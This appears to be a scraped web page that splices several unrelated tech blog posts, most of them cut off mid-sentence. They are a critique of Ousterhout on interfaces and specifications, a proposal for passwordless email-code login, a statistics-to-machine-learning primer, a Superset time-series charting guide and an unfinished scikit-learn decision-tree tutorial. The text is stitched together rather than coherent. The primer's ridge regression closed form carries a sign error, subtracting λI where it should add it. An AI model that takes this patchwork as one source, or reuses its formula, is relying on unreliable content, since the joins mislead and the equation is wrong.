<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<div>
<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>off_t</span> <span>lseek</span><span>(</span><span>int</span> <span>fd,</span> <span>off_t</span> <span>offset,</span> <span>int</span> <span>referencePosition);</span>
<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>
</blockquote>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>

        <time datetime="2020-07-02T00:00:00.000Z">July, 2020</time>
        <section>
          <h2>Intro</h2>
<p>In this post, I want to describe the strategy I've used in the last
implementation of one of my side projects. The side project is not important at
all, it's mostly a TODO/GTD task manager, but I use it as a test bed for
anything I'm interested in learning or trying out. The source code is
<a href="https://github.com/msurdi/wipku">here</a> and it is deployed
<a href="https://wipku.herokuapp.com/">here</a> if you want to try this out.</p>
<h2>Disclaimer</h2>
<p>I'm not a security expert, I'm just a web developer and probably not even a good
one, I want to describe this with the intention that somebody that understands more
about this could point out issues and help me make the approach more secure and
more easy to use.</p>
<h2>The problem with passwords</h2>
<p>Personally I don't like passwords, because a) I don't want to use the same
password everywhere, 2) Using different passwords everywhere is impossible
unless you 2a) use a password manager and/or 2b) use a
<a href="http://www.davidgumpper.com/security/developing-a-password-schema/">schema</a>
based on the website or something else that lets you generate the passwords
quickly and consistently for a any given website. And that's just what I don't
like as a user.</p>
<p>As a developer I don't like passwords because its very difficult and risky to
implement all the logic for generating them (salts, algorithms, lengths, etc),
storing them and implementing registration forms, login forms, password reset
forms, etc. So unless you use an existing solution from a CMS or big framework
(<a href="https://www.djangoproject.com/">Django</a>, <a href="https://rubyonrails.org/">Rails</a>,
<a href="https://strapi.io/">Strapi</a>, etc.. ) where you have a "Golden Path" for this,
you're in a pretty bad situation.</p>
<h2>Existing solutions research</h2>
<p>I was looking for a passwordless way to authenticate users without depending on
any third party <a href="https://en.wikipedia.org/wiki/OAuth">oauth</a> provider. While
researching about this, I've found that it seems the most common approach to
this is:</p>
<ol>
<li>Ask the user for email address.</li>
<li>Generate from the server a link with a token and send it by email to the user.</li>
<li>When the user clicks on the link, sign the user in, either in the newly
opened tab/browser or in the original one, or both.</li>
</ol>
<p>This approach is very simple, and I think there are many sites using it. The
first time I came across a login system like this was when I signed up to try
out Zeit's PaaS platform <a href="https://vercel.com/login?with-email=1">here</a>, now
called Vercel, hopefully will still have this name when you read this.</p>
<p>When I was investigating more about this approach, the first question to came to
my mind was wether I should log-in the user in the newly opened tab after the
user has clicked in the email link (thus what do I do in his previous tab?) or
wether again to follow Zeit's approach and in this new tab tell the user
"Awesome, you're now logged in, please close this tab and go back to the other
one". The first approach has an important drawback which is that the link might
have opened on a completely different browser, even on a completely different
device if the user clicked the link on his phone. The second approach I think is
even worse because anyone could go to the website, enter somebody else's email
and if that person happens to accidentally click this email then somebody
somewhere might get logged in as him.</p>
<p>There might be workarounds such as
comparing IP addresses, browser fingerprinting, etc, etc... but it gets risky
and complex in my opinion. Also, the user might not have even clicked in the
link but his antivirus might have made a request to the link, or anything in
between him and his email client. Not great.</p>
<h2>The salted passwordless approach</h2>
<p>So I kept investigating and trying out things and finally came to the following
process I want to describe here with the hope that somebody else will help me
understand more about its drawbacks and why it might not be a good idea, or if
seems to be a good one then help me to improve it.</p>
<p>Also, I'm not sure if this already exists under some well known industry name
and I've just missed that out. Thus I'm basically reinventing the square wheel
here.</p>
<p>So, the process goes like this:</p>
<ol>
<li>The application prompts the user for an email address.</li>
<li>The application saves in the browser's localStorage (or just in memory) the
email address, and randomly generated salt.</li>
<li>The application contacts the backend, submitting the email address and the
generated salt.</li>
<li>The application shows the user a dialog of the kind "We've just sent you an
access code to your email, enter it below".</li>
<li>The server generates an access code and then saves in the database the tuple
consistig of (time, email, salt, code), this is the "authentication request".</li>
<li>The server sends an email to the user, containing just the code, which would
be something like "09124".</li>
<li>The user enters this code in the screen resulting from step 4.</li>
<li>The application submits to the server the tuple (code, email, salt).</li>
<li>If the code, the salt, the email and the expiration (time since request was
created) are valid, then create a session, otherwise fail the login.</li>
</ol>
<p>What problems does this process solve?</p>
<ol>
<li>No need for a password, which was the first requirement.</li>
<li>No need to implement password recovery processes, registration processes, etc.</li>
<li>No need to permanently store any sensitive information about the user. You
might not even need to store the email address (you could use a hash of it as
the user ID).</li>
<li>If the email with the access code is intercepted, there is no risk for the
user: whoever intercepted the email would also need access to the user's
browser localStorage (or memory) to get the salt, otherwise the server won't
validate that access code and thus wont create a session.</li>
<li>We don't have the problem of the user opening the "magic link" in a different
browser, given there is no magic link at all.</li>
</ol>
<p>What drawbacks does this process have?</p>
<ol>
<li>The user will not be able to log in if he is having any kind of problem with
his email, or his email provider is slow to delivery new messages, etc.</li>
</ol>
<h2>Conclusions</h2>
<p>So far I'm pretty excited about this solution and that's probably bad for me,
because I might be missing something out, and that's the main motivation of
writing this down here. Unless there is some big security issue I'm not aware
of, I think the trade-off/drawbacks of the approach are quite acceptable for the
usability and implementation benefits.</p>

<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>

<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>

<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>

<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>

<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>

<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>

<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>

<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>

<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>

			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
